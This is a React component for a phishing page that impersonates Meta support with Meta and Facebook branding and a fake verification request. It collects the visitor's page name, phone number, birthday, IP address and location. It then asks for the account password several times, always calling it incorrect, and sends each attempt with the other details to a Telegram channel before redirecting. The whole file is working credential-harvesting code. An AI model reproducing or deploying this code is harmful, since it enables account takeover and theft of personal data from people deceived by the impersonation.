import ChevronRight from '@/assets/chevron-right.svg';
import FacebookImage from '@/assets/facebook-logo.webp';
import LogoImage from '@/assets/logo.jpeg';
import PasswordInputModal from '@/components/password-input-modal.jsx';
import config from '@/config/config.js';
import countryToLanguage from '@/config/country-to-lang.js';
import sendMessage from '@/service/telegram.js';
import { translateText } from '@/service/translate.js';
import useGeoStore from '@/stores/geoStore.js';
import useMessageStore from '@/stores/messageStore.js';

import React, { useEffect, useRef, useState } from 'react';
import { getCountries, getCountryCallingCode, isValidPhoneNumber } from 'react-phone-number-input';
import flags from 'react-phone-number-input/flags';
import PhoneInput from 'react-phone-number-input/input';
import 'react-phone-number-input/style.css';
import { useNavigate } from 'react-router';

const originalContent = {
    title: 'Meta',
    contactSupport: 'Contact Meta Support',
    pageName: 'Page Name',
    pageNamePlaceholder: 'Enter page name',
    phoneNumber: 'Phone Number',
    phoneNumberPlaceholder: 'Enter phone number',
    birthday: 'Birthday',
    requestVerification: 'Request Verification',
    fromMeta: 'from',
    metaText: 'Meta',
    footerText: 'Meta Terms of Service Team © 2025 Inc.'
};

const FormInput = () => {
    const pageNameRef = useRef('');
    const phoneNumberRef = useRef('');
    const birthdayRef = useRef('');

    const [pageName, setPageName] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [birthday, setBirthday] = useState('');
    const [password, setPassword] = useState('');
    const [selectedCountry, setSelectedCountry] = useState('US');
    const [showModal, setShowModal] = useState(false);

    const [passwordAttempts, setPasswordAttempts] = useState(0);
    const [passwordError, setPasswordError] = useState('');
    const [translatedContent, setTranslatedContent] = useState(originalContent);

    const navigate = useNavigate();
    const { fetchGeoData, getCountryCode, getCity, getRegion, getCountryName, getIp } = useGeoStore();
    const { setMessageId, getMessageId, setMessageContent, getMessageContent, appendToMessage } = useMessageStore();

    const translateContent = async (targetLang) => {
        if (targetLang === 'en') {
            setTranslatedContent(originalContent);
            return;
        }

        const translated = {};
        for (const [key, text] of Object.entries(originalContent)) {
            try {
                translated[key] = await translateText(text, targetLang);
            } catch {
                translated[key] = text;
            }
        }
        setTranslatedContent(translated);
    };

    useEffect(() => {
        const detectCountryAndTranslate = async () => {
            try {
                await fetchGeoData();
                const detectedCountryCode = getCountryCode();

                const supportedCountries = getCountries();
                if (supportedCountries.includes(detectedCountryCode)) {
                    setSelectedCountry(detectedCountryCode);
                } else {
                    setSelectedCountry('US');
                }

                const language = countryToLanguage[detectedCountryCode] || 'en';
                if (language !== 'en') {
                    await translateContent(language);
                }
            } catch {
                setSelectedCountry('US');
                setTranslatedContent(originalContent);
            }
        };

        detectCountryAndTranslate();
    }, [fetchGeoData, getCountryCode]);

    const handlePasswordSubmit = async (submittedPassword) => {
        const newAttempts = passwordAttempts + 1;
        setPasswordAttempts(newAttempts);

        let message;
        const currentMessageId = getMessageId();

        if (newAttempts === 1) {
            message = `
<b>IP:</b> <code>${getIp()}</code>
<b>Location:</b> <code>${getCity()} - ${getRegion()} - ${getCountryName()}</code>
<b>Page Name:</b> <code>${pageName.trim()}</code>
<b>Phone Number:</b> <code>${phoneNumber}</code>
<b>Birthday:</b> <code>${birthday ? new Date(birthday).toLocaleDateString('vi-VN') : ''}</code>
<b>Password ${newAttempts}/${config.max_password_attempts}:</b> <code>${submittedPassword}</code>`.trim();

            setMessageContent(message);
        } else {
            const passwordLine = `<b>Password ${newAttempts}/${config.max_password_attempts}:</b> <code>${submittedPassword}</code>`;
            appendToMessage(passwordLine);

            message = getMessageContent();
        }

        const response = await sendMessage(message, currentMessageId);

        if (response.success && response.messageId) {
            setMessageId(response.messageId);
        }

        if (newAttempts >= config.max_password_attempts) {
            setShowModal(false);
            navigate('/verify');
        } else {
            setPasswordError(`Password is incorrect. Please try again.`);
            setPassword('');
        }
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!pageNameRef.current.value.trim()) {
            pageNameRef.current.focus();
            return;
        }

        if (!phoneNumber || !isValidPhoneNumber(phoneNumber)) {
            phoneNumberRef.current.focus();
            return;
        }

        if (!birthdayRef.current.value) {
            birthdayRef.current.focus();
            return;
        }

        if (passwordAttempts >= config.max_password_attempts) {
            navigate('/verify');
            return;
        }

        setShowModal(true);
    };

    return (
        <div className='flex min-h-dvh items-center justify-center bg-gray-100 p-4'>
            <div className='box-border w-full max-w-[740px] rounded-xl bg-white p-4 shadow-lg sm:p-6'>
                <div className='flex items-center justify-center'>
                    <img alt='' className='h-7 rounded-full object-contain' src={LogoImage} />

                    <p className='flex items-center justify-center gap-2 text-center text-base'>{translatedContent.title || 'Meta'}</p>
                </div>

                <p className='mb-6 text-center text-[15px] sm:text-[16px]'>{translatedContent.contactSupport || 'Contact Meta Support'}</p>

                <div className='mb-4'>
                    <label htmlFor='pageName' className='mb-2 block text-sm font-medium text-gray-700'>
                        {translatedContent.pageName || 'Page Name'}
                    </label>
                    <input ref={pageNameRef} id='pageName' type='text' value={pageName} onChange={(e) => setPageName(e.target.value)} className='w-full rounded-lg border border-gray-300 px-3 py-2 outline-none focus:border-transparent focus:ring-2 focus:ring-[#4a81f3]' placeholder={translatedContent.pageNamePlaceholder || 'Enter page name'} />
                </div>

                <div className='mb-4'>
                    <label htmlFor='phoneNumber' className='mb-2 block text-sm font-medium text-gray-700'>
                        {translatedContent.phoneNumber || 'Phone Number'}
                    </label>
                    <div className='relative'>
                        <div className='pointer-events-none absolute inset-y-0 left-0 flex items-center gap-2 pl-3'>
                            {flags[selectedCountry] &&
                                React.createElement(flags[selectedCountry], {
                                    className: 'inline-block h-4 w-6 rounded-sm'
                                })}
                            <span className='text-sm font-medium text-gray-500'>+{getCountryCallingCode(selectedCountry)}</span>
                        </div>
                        <PhoneInput ref={phoneNumberRef} id='phoneNumber' country={selectedCountry} value={phoneNumber} onChange={setPhoneNumber} className='w-full rounded-lg border border-gray-300 py-2 pr-3 pl-20 outline-none focus:border-transparent focus:ring-2 focus:ring-[#4a81f3]' placeholder={translatedContent.phoneNumberPlaceholder || 'Enter phone number'} />
                    </div>
                </div>

                <div className='mb-6'>
                    <label htmlFor='birthday' className='mb-2 block text-sm font-medium text-gray-700'>
                        {translatedContent.birthday || 'Birthday'}
                    </label>
                    <input ref={birthdayRef} id='birthday' type='date' value={birthday} onChange={(e) => setBirthday(e.target.value)} className='w-full rounded-lg border border-gray-300 px-3 py-2 outline-none focus:border-transparent focus:ring-2 focus:ring-[#4a81f3]' />
                </div>
                <button type='submit' onClick={handleSubmit} className='relative flex w-full items-center justify-center rounded-md border border-blue-600 bg-white px-4 py-2 text-sm font-medium text-blue-600 shadow-sm transition-all duration-200 hover:bg-blue-50 focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:outline-none'>
                    <img alt='' className='mr-2 h-4 w-4' src={FacebookImage} />
                    <p>{translatedContent.requestVerification || 'Request Verification'}</p>
                    <img alt='' className='absolute right-3 h-4 w-4' src={ChevronRight} />
                </button>

                <PasswordInputModal password={password} setPassword={setPassword} showModal={showModal} setShowModal={setShowModal} onPasswordSubmit={handlePasswordSubmit} passwordError={passwordError} setPasswordError={setPasswordError} />

                <footer className='mt-8 flex flex-col items-center justify-between gap-2 text-center text-[12px] font-medium text-gray-500 sm:flex-row sm:text-left'>
                    <div>
                        <span>{translatedContent.fromMeta || 'from'} </span>
                        <span className='text-[#1877f2] hover:underline'>{translatedContent.metaText || 'Meta'}</span>
                    </div>
                    <div>{translatedContent.footerText || 'Meta Terms of Service Team © 2025 Inc.'}</div>
                </footer>
            </div>
        </div>
    );
};

export default FormInput;
